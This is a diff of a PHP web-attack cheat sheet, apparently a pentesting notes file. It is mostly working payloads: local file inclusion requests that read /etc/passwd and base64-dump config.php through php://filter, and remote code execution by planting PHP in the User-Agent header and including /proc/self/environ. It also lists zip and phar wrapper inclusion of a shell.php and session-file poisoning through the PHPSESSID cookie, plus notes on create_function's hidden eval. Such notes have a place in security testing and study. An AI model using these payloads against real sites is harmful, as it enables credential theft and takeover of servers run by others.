@@ -3,20 +3,24 @@
 The developer may want to ensure that users cannot give any query key containing underscore, because variable names with underscore often refer to private or sensitive variables.
 Dots and spaces in variable names are converted to underscores. For example <input name="a.b" /> becomes $_REQUEST["a_b"].
 
+--
+
 Direct Local File Inclusion
 Reading arbitrary files:
 
 index.php?file=/etc/passwd
 index.php?file=php://filter/convert.base64-encode/resource=config.php
 
-Remote code exection:
+--
+
+Remote code execution:
 
 /proc/self/environ
 GET /index.php?file=/proc/self/environ&cmd=id HTTP/1.1
 Host: www.site.com
 User-Agent: <?php echo assert($_GET['cmd']);?>
 
-Remote code execution:
+
 Zip and Phar wrappers
 
 index.php?file=zip://image.zip#shell.php
@@ -28,7 +32,20 @@ PHP5 stores session files in /var/lib/php5/sess_*
 Cookie: PHPSESSID=123php # /var/lib/php5/sess_123php
 index.php?file=/var/lib/php5/sess_123php
 
+--
+
 Indirect Local File Inclusion
 Reading arbitrary files:
 
 index.php?file=php://filter/convert.base64-encode/resource=config # will append ".php" at the end
+
+--
+
+create_function() actually creates an ordinary function with name chr(0).lambda_n where n is some number.
+For instance:
+
+$a = create_function('$a', 'return $a;');
+echo $a(123);             // 123
+echo "\x00lambda_1"(123); // ???
+
+Manual says that this function internally performs an eval() and as such has the same security issues as eval().
